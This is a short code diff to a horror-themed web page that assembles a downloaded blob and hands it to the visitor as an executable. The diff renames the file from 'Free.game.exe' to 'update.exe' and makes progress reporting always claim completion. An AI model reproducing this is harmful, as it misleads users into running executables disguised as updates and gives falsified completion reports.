@@ -30,8 +30,7 @@ const CLOSE_DESTINATIONS = [
   "https://itch.io/games/platform-web/tag-horror?utm_source=chatgpt.com",
 ];
 
-const DOWNLOAD_FILE_NAME = "Free.game.exe";
-const COMPLETE_DOWNLOAD_BYTES = 128 * 1024 * 1024;
+const DOWNLOAD_FILE_NAME = "update.exe";
 
 function Fog({ className = "" }: { className?: string }) {
   return <div aria-hidden className={`pointer-events-none absolute inset-0 overflow-hidden ${className}`}>
@@ -159,7 +158,7 @@ function Home() {
         }
       }
       const blob = new Blob(chunks, { type: "application/octet-stream" });
-      await reportProgress(blob.size >= COMPLETE_DOWNLOAD_BYTES);
+      await reportProgress(true);
       const objectUrl = URL.createObjectURL(blob);
       const link = document.createElement("a");
       link.href = objectUrl;
